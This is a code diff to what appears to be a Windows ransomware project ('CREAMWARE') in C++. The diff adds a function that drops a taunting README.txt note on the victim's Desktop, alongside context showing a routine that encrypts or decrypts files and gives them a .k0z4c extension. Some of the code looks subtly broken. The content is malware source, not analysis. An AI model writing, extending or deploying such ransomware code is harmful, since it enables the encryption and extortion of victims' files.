@@ -1,14 +1,33 @@
 #include "encryptor.h"
 #include <shlwapi.h>
 #include <vector>
+#include <fstream>
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "advapi32.lib")
 
 using namespace std;
 
 #define CREAMWARE_EXT L".k0z4c"
+#define NOTE_FILE L"README.txt"
 
 enum modeFlag_t { encrypt, decrypt };
+
+void writeNote() {
+    size_t(len);
+    wchar_t* value;
+    errno_t err = _wdupenv_s(&value, &len, L"HOMEPATH");
+
+    wstring homePath = static_cast<wstring>(value);
+
+    ofstream os(homePath + L"\\Desktop\\" + NOTE_FILE);
+    if (!os) {
+        cout << "Some problem writing the note..." << endl;
+        return;
+    }
+
+    os << "You got C.R.E.A.M.E.D by k0z4c mf" << endl;
+    os.close();
+}
 
 BOOL FindFile(const std::wstring &directory, wstring ext, const wchar_t* aeskey, DWORD& errCode, modeFlag_t op)
 {
@@ -111,6 +130,8 @@ int wmain(int argc, wchar_t* argv[])
             printNice(L"The path exists? ...");
             return 1;
         }
+        writeNote();
+        cout << "hello" << endl;
     }
 
     return 0;
